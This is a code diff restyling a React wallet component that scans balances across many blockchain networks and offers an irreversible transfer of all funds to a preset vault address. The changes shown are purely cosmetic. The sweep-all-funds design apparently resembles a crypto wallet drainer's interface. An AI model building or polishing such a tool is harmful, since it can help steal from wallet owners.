@@ -71,12 +71,14 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
   if (!walletState.isConnected) {
     return (
-      <Card>
+      <Card className="bg-card/50 border-border ethereum-glass">
         <CardContent className="pt-6">
           <div className="text-center py-8">
-            <div className="text-gray-500 mb-4">
-              <h3 className="text-lg font-medium text-gray-900 mb-2">Wallet Not Connected</h3>
-              <p className="text-gray-600">Connect your wallet to view balance and transfer funds</p>
+            <div className="text-muted-foreground mb-4">
+              <h3 className="text-lg font-medium bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent mb-2">
+                Wallet Not Connected
+              </h3>
+              <p className="text-muted-foreground">Connect your wallet to view balance and transfer funds</p>
             </div>
           </div>
         </CardContent>
@@ -85,16 +87,18 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
   }
 
   return (
-    <Card>
+    <Card className="bg-card/50 border-border ethereum-glass">
       <CardContent className="pt-6">
         <div className="flex justify-between items-center mb-6">
-          <h2 className="text-xl font-semibold text-gray-900">Current Balance</h2>
+          <h2 className="text-xl font-semibold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
+            Current Balance
+          </h2>
           <details className="text-xs">
-            <summary className="cursor-pointer text-blue-600 hover:text-blue-800 flex items-center gap-1">
+            <summary className="cursor-pointer text-accent hover:text-accent-light flex items-center gap-1 ethereum-pulse">
               <Bug className="h-3 w-3" />
               Debug Info
             </summary>
-            <div className="mt-2 p-2 bg-gray-50 rounded text-xs font-mono">
+            <div className="mt-2 p-2 bg-muted/30 border border-border/50 rounded text-xs font-mono text-muted-foreground">
               <div><strong>Connection:</strong> {walletState.isConnected ? 'Connected' : 'Disconnected'}</div>
               <div><strong>Address:</strong> {walletState.address || 'None'}</div>
               <div><strong>Network:</strong> {walletState.networkId || 'None'}</div>
@@ -109,37 +113,38 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
         {/* Multi-Network Portfolio Display */}
         <div className="mb-8">
           <div className="text-center mb-6">
-            <div className="text-3xl font-bold text-gray-900 mb-2">
+            <div className="text-3xl font-bold bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent mb-2 ethereum-float">
               Multi-Network Portfolio
             </div>
-            <div className="text-lg text-gray-600">
+            <div className="text-lg text-accent font-semibold ethereum-pulse">
               Total Value: {balanceUSD}
             </div>
           </div>
 
           {/* Current Network Balance */}
-          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
-            <h3 className="font-semibold text-blue-900 mb-3">
+          <div className="bg-muted/20 border border-primary/30 rounded-lg p-4 mb-4 ethereum-glow">
+            <h3 className="font-semibold text-primary mb-3 flex items-center gap-2">
+              <span className="w-2 h-2 bg-success rounded-full animate-pulse"></span>
               Current Network: {walletState.networkName}
             </h3>
 
             {/* Native Currency */}
-            <div className="bg-white rounded p-3 mb-3">
+            <div className="bg-card/80 border border-border/50 rounded p-3 mb-3 ethereum-glass">
               <div className="flex justify-between items-center">
                 <div className="flex items-center space-x-2">
-                  <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs font-bold">
+                  <div className="w-8 h-8 ethereum-gradient rounded-full flex items-center justify-center text-white text-xs font-bold ethereum-pulse">
                     ETH
                   </div>
                   <div>
-                    <div className="font-medium">Ethereum</div>
-                    <div className="text-xs text-gray-500">Native Currency</div>
+                    <div className="font-medium text-foreground">Ethereum</div>
+                    <div className="text-xs text-muted-foreground">Native Currency</div>
                   </div>
                 </div>
                 <div className="text-right">
-                  <div className="font-semibold">
+                  <div className="font-semibold text-accent">
                     {walletState.ethBalance ? parseFloat(walletState.ethBalance).toFixed(6) : "0.000000"} ETH
                   </div>
-                  <div className="text-xs text-gray-600">
+                  <div className="text-xs text-muted-foreground">
                     ${((parseFloat(walletState.ethBalance || '0')) * 2500).toFixed(2)}
                   </div>
                 </div>
@@ -150,24 +155,24 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
             {walletState.tokenBalances && walletState.tokenBalances.length > 0 && (
               <div className="space-y-2">
                 {walletState.tokenBalances.map((token, index) => (
-                  <div key={index} className="bg-white rounded p-3">
+                  <div key={index} className="bg-card/80 border border-border/50 rounded p-3 ethereum-glass">
                     <div className="flex justify-between items-center">
                       <div className="flex items-center space-x-2">
-                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white text-xs font-bold">
+                        <div className="w-8 h-8 bg-gradient-to-r from-secondary to-accent rounded-full flex items-center justify-center text-white text-xs font-bold ethereum-pulse">
                           {token.symbol.substring(0, 3)}
                         </div>
                         <div>
-                          <div className="font-medium">{token.symbol}</div>
-                          <div className="text-xs text-gray-500 font-mono">
+                          <div className="font-medium text-foreground">{token.symbol}</div>
+                          <div className="text-xs text-muted-foreground font-mono">
                             {token.contractAddress}
                           </div>
                         </div>
                       </div>
                       <div className="text-right">
-                        <div className="font-semibold">
+                        <div className="font-semibold text-accent">
                           {parseFloat(token.balance).toFixed(6)} {token.symbol}
                         </div>
-                        <div className="text-xs text-gray-600">
+                        <div className="text-xs text-muted-foreground">
                           {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                         </div>
                       </div>
@@ -179,31 +184,31 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
           </div>
 
           {/* All Networks Summary - Show instantly with loading states */}
-          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
-            <h3 className="font-semibold text-green-900 mb-3 flex items-center">
-              <Coins className="w-5 h-5 mr-2" />
+          <div className="bg-muted/20 border border-accent/30 rounded-lg p-4 ethereum-glow">
+            <h3 className="font-semibold text-accent mb-3 flex items-center">
+              <Coins className="w-5 h-5 mr-2 ethereum-pulse" />
               All Networks Scan 
               {!walletState.allNetworksLoaded && (
-                <Loader2 className="w-4 h-4 ml-2 animate-spin text-green-600" />
+                <Loader2 className="w-4 h-4 ml-2 animate-spin text-accent" />
               )}
               {walletState.allNetworksLoaded && walletState.networkBalances && (
-                <span className="ml-2 text-sm">({walletState.networkBalances.length} networks scanned)</span>
+                <span className="ml-2 text-sm text-muted-foreground">({walletState.networkBalances.length} networks scanned)</span>
               )}
             </h3>
 
             {!walletState.allNetworksLoaded ? (
               <div className="text-center py-4">
-                <div className="text-sm text-green-700">Scanning all networks instantly...</div>
-                <div className="text-xs text-green-600 mt-1">This may take a few seconds</div>
+                <div className="text-sm text-accent">Scanning all networks instantly...</div>
+                <div className="text-xs text-muted-foreground mt-1">This may take a few seconds</div>
               </div>
             ) : walletState.networkBalances && walletState.networkBalances.length > 0 ? (
               <div className="space-y-3 max-h-64 overflow-y-auto">
                 {walletState.networkBalances.map((network, networkIndex) => (
-                  <div key={networkIndex} className="bg-white rounded p-3">
-                    <div className="font-medium text-gray-900 mb-2 flex items-center justify-between">
+                  <div key={networkIndex} className="bg-card/80 border border-border/50 rounded p-3 ethereum-glass">
+                    <div className="font-medium text-foreground mb-2 flex items-center justify-between">
                       <span>{network.networkName}</span>
                       {network.totalUsdValue > 0 && (
-                        <span className="text-sm font-semibold text-green-600">
+                        <span className="text-sm font-semibold text-success">
                           ${network.totalUsdValue.toFixed(2)}
                         </span>
                       )}
@@ -211,9 +216,9 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
                     {/* Native Currency Balance */}
                     {parseFloat(network.nativeBalance) > 0 && (
-                      <div className="flex justify-between items-center text-sm mb-2 bg-blue-50 rounded p-2">
-                        <span className="text-gray-700 font-medium">{network.nativeCurrency}</span>
-                        <span className="font-semibold text-blue-700">
+                      <div className="flex justify-between items-center text-sm mb-2 bg-primary/10 border border-primary/30 rounded p-2 ethereum-glow">
+                        <span className="text-foreground font-medium">{network.nativeCurrency}</span>
+                        <span className="font-semibold text-primary">
                           {parseFloat(network.nativeBalance).toFixed(6)} {network.nativeCurrency}
                         </span>
                       </div>
@@ -221,19 +226,19 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
                     {/* Token Balances */}
                     {network.tokenBalances.map((token, tokenIndex) => (
-                      <div key={tokenIndex} className="border-l-2 border-green-200 pl-3 mb-2 bg-green-50 rounded-r p-2">
+                      <div key={tokenIndex} className="border-l-2 border-accent/50 pl-3 mb-2 bg-accent/10 rounded-r p-2 ethereum-glass">
                         <div className="flex justify-between items-center text-sm">
                           <div>
-                            <div className="font-medium text-green-800">{token.symbol}</div>
-                            <div className="text-xs text-green-600 font-mono">
+                            <div className="font-medium text-foreground">{token.symbol}</div>
+                            <div className="text-xs text-muted-foreground font-mono">
                               {token.contractAddress?.slice(0, 10)}...
                             </div>
                           </div>
                           <div className="text-right">
-                            <div className="font-semibold text-green-700">
+                            <div className="font-semibold text-accent">
                               {parseFloat(token.balance).toFixed(6)} {token.symbol}
                             </div>
-                            <div className="text-xs text-green-600">
+                            <div className="text-xs text-muted-foreground">
                               {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                             </div>
                           </div>
@@ -242,7 +247,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                     ))}
 
                     {network.tokenBalances.length === 0 && parseFloat(network.nativeBalance) === 0 && (
-                      <div className="text-xs text-gray-500 italic bg-gray-50 rounded p-2">
+                      <div className="text-xs text-muted-foreground italic bg-muted/20 rounded p-2 border border-border/50">
                         No funds found on this network
                       </div>
                     )}
@@ -251,33 +256,33 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
               </div>
             ) : (
               <div className="text-center py-4">
-                <div className="text-sm text-gray-600">No network balances loaded yet</div>
+                <div className="text-sm text-muted-foreground">No network balances loaded yet</div>
               </div>
             )}
           </div>
         </div>
 
-        <Alert className="mb-6 border-warning bg-yellow-50">
-          <AlertTriangle className="h-4 w-4 text-warning" />
-          <AlertDescription className="text-yellow-800">
-            <div className="font-medium">Transfer All Cryptocurrencies</div>
-            <div className="text-sm text-yellow-700 space-y-1">
-              <div>• <strong>Current Network:</strong> Transfer ETH and ERC-20 tokens from the connected network</div>
-              <div>• <strong>All Networks:</strong> Scan and transfer from ALL supported networks (Ethereum, Polygon, BSC, etc.)</div>
-              <div>• Both actions are IRREVERSIBLE and will send funds to the configured vault address</div>
+        <Alert className="mb-6 border-warning bg-warning/10 ethereum-glass">
+          <AlertTriangle className="h-4 w-4 text-warning animate-pulse" />
+          <AlertDescription className="text-foreground">
+            <div className="font-medium text-warning">Transfer All Cryptocurrencies</div>
+            <div className="text-sm text-muted-foreground space-y-1">
+              <div>• <strong className="text-primary">Current Network:</strong> Transfer ETH and ERC-20 tokens from the connected network</div>
+              <div>• <strong className="text-secondary">All Networks:</strong> Scan and transfer from ALL supported networks (Ethereum, Polygon, BSC, etc.)</div>
+              <div>• Both actions are <strong className="text-destructive">IRREVERSIBLE</strong> and will send funds to the configured vault address</div>
             </div>
           </AlertDescription>
         </Alert>
 
         <div className="mb-4">
-          <label className="block text-sm font-medium text-gray-700 mb-2">
+          <label className="block text-sm font-medium text-muted-foreground mb-2">
             Destination Address (All funds will be sent here)
           </label>
-          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
-            <div className="text-sm font-mono text-blue-900 break-all">
+          <div className="bg-primary/10 border border-primary/30 rounded-lg p-3 ethereum-glow">
+            <div className="text-sm font-mono text-primary break-all">
               {destinationAddress}
             </div>
-            <div className="text-xs text-blue-700 mt-1">
+            <div className="text-xs text-muted-foreground mt-1">
               ✓ Valid Ethereum address configured
             </div>
           </div>
@@ -286,10 +291,10 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
         {/* Cross-Network Balance Summary */}
         {walletState.isConnected && (
           <div className="mb-6">
-            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
+            <div className="bg-success/10 border border-success/30 rounded-lg p-4 ethereum-glow">
               <div className="flex items-center space-x-2 mb-3">
-                <CheckCircle className="h-5 w-5 text-green-600" />
-                <div className="font-semibold text-green-900">
+                <CheckCircle className="h-5 w-5 text-success ethereum-pulse" />
+                <div className="font-semibold text-foreground">
                   {(hasAnyNetworkFunds || walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0)) ? "✔️ Funds detected across networks:" : "No funds detected on any network"}
                 </div>
               </div>
@@ -299,13 +304,13 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                   {/* Show current network funds first */}
                   {(parseFloat(walletState.ethBalance || '0') > 0 || walletState.tokenBalances.length > 0) && (
                     <div className="flex justify-between items-center text-sm">
-                      <div className="font-medium text-green-800">
+                      <div className="font-medium text-primary">
                         • {walletState.networkName || 'Current Network'}:
                       </div>
-                      <div className="text-green-700">
+                      <div className="text-accent">
                         {parseFloat(walletState.ethBalance || '0') > 0 && `${parseFloat(walletState.ethBalance || '0').toFixed(4)} ETH`}
                         {walletState.tokenBalances.length > 0 && ` + ${walletState.tokenBalances.length} tokens`}
-                        <span className="ml-2 font-semibold">
+                        <span className="ml-2 font-semibold text-success">
                           (${walletState.totalUsdValue.toFixed(2)})
                         </span>
                       </div>
@@ -315,14 +320,14 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                   {/* Show other network funds */}
                   {walletState.networkBalances.filter(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0).map((network, index) => (
                     <div key={index} className="flex justify-between items-center text-sm">
-                      <div className="font-medium text-green-800">
+                      <div className="font-medium text-primary">
                         • {network.networkName}:
                       </div>
-                      <div className="text-green-700">
+                      <div className="text-accent">
                         {parseFloat(network.nativeBalance) > 0 && `${parseFloat(network.nativeBalance).toFixed(4)} ${network.nativeCurrency}`}
                         {network.tokenBalances.length > 0 && ` + ${network.tokenBalances.length} tokens`}
                         {network.totalUsdValue > 0 && (
-                          <span className="ml-2 font-semibold">
+                          <span className="ml-2 font-semibold text-success">
                             (${network.totalUsdValue.toFixed(2)})
                           </span>
                         )}
@@ -330,10 +335,10 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                     </div>
                   ))}
                   
-                  <div className="border-t border-green-300 pt-2 mt-3">
-                    <div className="flex justify-between items-center font-semibold text-green-900">
+                  <div className="border-t border-success/30 pt-2 mt-3">
+                    <div className="flex justify-between items-center font-semibold text-foreground">
                       <div>Total Cross-Network Value:</div>
-                      <div>${(crossNetworkValue + walletState.totalUsdValue).toFixed(2)}</div>
+                      <div className="text-success text-lg">${(crossNetworkValue + walletState.totalUsdValue).toFixed(2)}</div>
                     </div>
                   </div>
                 </div>
@@ -347,7 +352,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
             <Button
               onClick={handleMultiNetworkTransfer}
               disabled={isTransferring || isWalletLoading || (!hasAnyNetworkFunds && !walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0) && parseFloat(walletState.ethBalance || '0') <= 0 && walletState.tokenBalances.length === 0)}
-              className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
+              className="w-full ethereum-gradient hover:ethereum-glow-strong text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2 ethereum-pulse transition-all duration-300"
             >
               {isWalletLoading ? (
                 <>
